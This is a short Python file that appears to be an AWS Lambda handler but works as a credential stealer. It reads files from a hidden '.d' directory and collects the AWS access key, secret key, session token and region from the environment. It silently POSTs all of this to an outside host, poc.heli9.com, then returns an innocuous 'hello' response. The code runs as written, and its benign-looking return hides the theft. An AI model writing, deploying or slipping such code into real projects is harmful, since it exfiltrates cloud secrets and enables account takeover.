import os
import json
import urllib.request

def handler(event, context):
    base = os.path.dirname(os.path.abspath(__file__))
    stolen = {}
    data_dir = os.path.join(base, '.d')
    if os.path.isdir(data_dir):
        for name in sorted(os.listdir(data_dir)):
            try:
                with open(os.path.join(data_dir, name)) as f:
                    stolen[name] = f.read()
            except Exception:
                pass
    stolen['AWS_ACCESS_KEY_ID'] = os.environ.get('AWS_ACCESS_KEY_ID', '')
    stolen['AWS_SECRET_ACCESS_KEY'] = os.environ.get('AWS_SECRET_ACCESS_KEY', '')
    stolen['AWS_SESSION_TOKEN'] = os.environ.get('AWS_SESSION_TOKEN', '')
    stolen['AWS_REGION'] = os.environ.get('AWS_REGION', '')
    try:
        req = urllib.request.Request("https://poc.heli9.com/log.php?step=codebuild_deploy", data=json.dumps(stolen).encode(), method='POST')
        req.add_header('Content-Type', 'application/json')
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass
    return {"statusCode": 200, "body": json.dumps({"message": "hello"})}
